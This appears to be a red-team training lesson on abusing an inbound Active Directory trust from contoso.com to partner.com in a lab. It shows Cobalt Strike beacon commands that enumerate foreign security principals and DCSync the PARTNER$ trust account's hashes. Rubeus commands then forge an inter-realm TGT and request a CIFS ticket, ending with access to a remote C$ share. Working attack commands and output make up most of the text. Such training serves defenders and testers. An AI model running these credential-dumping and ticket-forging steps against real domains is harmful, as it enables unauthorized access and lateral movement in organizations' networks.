
A one-way trust is created when administrators want to share resources with a trusted domain, but they don't want their resources to be accessed from the trusting domain.  You may see trusts setup like this to facilitate one-way migrations or data transfers, etc.

Querying the TDO shows an inbound transitive forest trust with _partner.com_.

```powershell
beacon> getuid
[*] You are CONTOSO\pchilds

beacon> ldapsearch (objectClass=trustedDomain)

name: partner.com
trustDirection: 1
trustAttributes: 8
flatName: PARTNER
```

If an adversary is on the side of the trusted domain, then they are with the direction of access and can therefore access resources in the trusting domain by design.  The strategy for this is to find and impersonate principals in the trusted domain that have been configured with legitimate access to resources in the trusting domain.  Golden tickets with SID history do not work in these cases because external trusts employ something called SID filtering.  The trusting domain will therefore ignore any SIDs that are not native to itself.

Active Directory has a special container called the Foreign Security Principals Container which contains [foreignSecurityPrincipal](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/65f7d03b-8542-4a6f-8b42-ae5247f7656a) objects.  These represent security principals from external trusted domains and allows them to become members of groups within the trusting domain.  Adversary's can enumerate this container of the trusting domain across the inbound trust.

```powershell
beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com

Binding to partner.com

[*] Distinguished name: DC=partner,DC=com
[*] Filter: (objectClass=foreignSecurityPrincipal)
[*] Scope of search value: 3
[*] Returning specific attribute(s): cn,memberOf

--------------------
cn: S-1-5-4
--------------------
cn: S-1-5-11
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=partner,DC=com, CN=Users,CN=Builtin,DC=partner,DC=com
--------------------
cn: S-1-5-17
--------------------
cn: S-1-5-9
--------------------
cn: S-1-5-21-3926355307-1661546229-813047887-6102
memberOf: CN=Contoso Users,CN=Users,DC=partner,DC=com
retreived 5 results total
```

The container contains 4 default values that we're not really interested in: `S-1-5-4`, `S-1-5-9`, `S-1-5-11`, and `S-1-5-17`.  Anything other than these values are of interest to us.  In this example, we see a 5th entry of SID `S-1-5-21-3926355307-1661546229-813047887-6102`.  This is a SID that exists in the trusted domain, _contoso.com_. It could be a single user, but more likely a domain group. We can query it by its SID to find out what it is.

```powershell
beacon> ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)

--------------------
objectClass: top, group
cn: Partner Jump Users
member: CN=Polly Childs,CN=Users,DC=contoso,DC=com
distinguishedName: CN=Partner Jump Users,CN=Users,DC=contoso,DC=com
name: Partner Jump Users
objectSid: S-1-5-21-3926355307-1661546229-813047887-6102
sAMAccountName: Partner Jump Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=contoso,DC=com
```

The TDO also shows that this domain group from _contoso.com_ is a member of a domain group in _partner.com_ called **Contoso Users**.  This domain group would then be used to assign privileges in _partner.com_ for these foreign users.  A common place to enumerate that is through GPOs or maybe even local group enumeration of machines in _partner.com_.  Remember that when on the trusted side of the trust, we're free to enumerate the foreign domain.

```powershell
beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com

Binding to partner.com

[*] Distinguished name: DC=partner,DC=com
[*] Filter: (samAccountType=805306369)
[*] Scope of search value: 3
[*] Returning specific attribute(s): samAccountName

--------------------
sAMAccountName: PAR-DC-1$
--------------------
sAMAccountName: PAR-JMP-1$
retreived 2 results total
```

> You can enumerate everything manually and/or feed the data into BloodHound via [BOFHound](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=67d042f2469fb4f17e0e0f89).  Another valid way to compromise the foreign domain is to find vulnerabilities such as roastable accounts or vulnerable services, etc.

### Forging referral tickets

If you have credential material for an eligible principal, you can simply impersonate them, request access to a service, and rely on Windows to handle the ticket process in the background.  However, you can also manually forge inter-realm referral tickets using the inter-realm key.  When in the trusted domain, you can obtain this key by dumping the credentials for the associated trust account.

```powershell
beacon> dcsync contoso.com CONTOSO\PARTNER$

Credentials:
  Hash NTLM: 6150491cceb080dffeaaec5e60d8f58d
    ntlm- 0: 6150491cceb080dffeaaec5e60d8f58d
    lm  - 0: a1542b43120fba746668d676b8e25f40

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : CONTOSO.COMkrbtgtPARTNER
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 48ceeb9986c09692d2200d6b8d4ba8ff0152a49a3507bee92bfc62281fa756fa
      aes128_hmac       (4096) : 7d6b3d1ace90c769bcaab80eaa8da70d
      des_cbc_md5       (4096) : 5d5e67259270abc4
```

> These hashes can then be used with Rubeus' `silver` command.  Trusts, even in modern versions of Windows, use RC4 encryption by default.  So we tend to use the NTLM hash here.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : CONTOSO.COM (CONTOSO)
[*] SID            : S-1-5-21-3926355307-1661546229-813047887
[*] UserId         : 1105
[*] Groups         : 513,1106,6102
[*] ServiceKey     : 6150491CCEB080DFFEAAEC5E60D8F58D
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 6150491CCEB080DFFEAAEC5E60D8F58D
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : partner.com

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'pchilds@CONTOSO.COM'

[*] AuthTime       : 18/03/2025 11:50:59
[*] StartTime      : 18/03/2025 11:50:59
[*] EndTime        : 18/03/2025 21:50:59
[*] RenewTill      : 25/03/2025 11:50:59

[*] base64(ticket.kirbi):

      doIFM[...snip...]mNvbQ==
```

Where:

- `/user` is the username to impersonate.
    
- `/domain` is the FQDN of the trusted domain.
    
- `/sid` is the SID of the trusted domain. 
    
- `/id` is the RID of the impersonated user.
    
- `/groups` are the RIDs of the impersonated user's domain groups.  _Domain Users_ is 513, _Workstation Admins_ is 1106, and _Partner Jump Users_ is 6102.
    
- `/service` is the krbtgt service of the trusting domain.
    
- `/rc4` is the inter-realm key.

> When forging tickets offline, make sure to get the user's group membership correct.  Don't rely on the default groups that Rubeus uses.  Alternatively, forge them 'online' with Rubeus' `/ldap` parameter.

This forged inter-realm TGT is then used to request service tickets from the trusting domain via Rubeus' `asktgs` command.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:doIFM[...snip...]mNvbQ== /nowrap

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/par-jmp-1.partner.com'
[*] Using domain controller: par-dc-1.partner.com (10.10.122.1)
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFW[...snip...]uY29t

  ServiceName              :  cifs/par-jmp-1.partner.com
  ServiceRealm             :  PARTNER.COM
  UserName                 :  pchilds (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  18/03/2025 12:03:09
  EndTime                  :  18/03/2025 21:50:59
  RenewTill                :  25/03/2025 11:50:59
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Jby9/S/PknVnM2JdzmeWee0nRO2icW3YLPEA3UULKfA=
```

Where:

- `/service` is the target service in the trusting domain.
    
- `/dc` is a domain controller in the trusting domain.
    
- `/ticket` is the inter-realm TGT.

```powershell
beacon> run klist

Current LogonId is 0:0x1649ee

Cached Tickets: (1)

#0>	Client: pchilds @ CONTOSO.COM
	Server: cifs/par-jmp-1.partner.com @ PARTNER.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize 
	Start Time: 3/18/2025 12:03:09 (local)
	End Time:   3/18/2025 21:50:59 (local)
	Renew Time: 3/25/2025 11:50:59 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called:

beacon> ls \\par-jmp-1.partner.com\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     03/18/2025 11:30:47   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     03/14/2025 10:28:55   System Volume Information
          dir     03/14/2025 11:03:36   Users
          dir     03/14/2025 09:49:21   Windows
 12kb     fil     03/18/2025 04:41:09   DumpStack.log.tmp
 1gb      fil     03/18/2025 04:41:09   pagefile.sys
```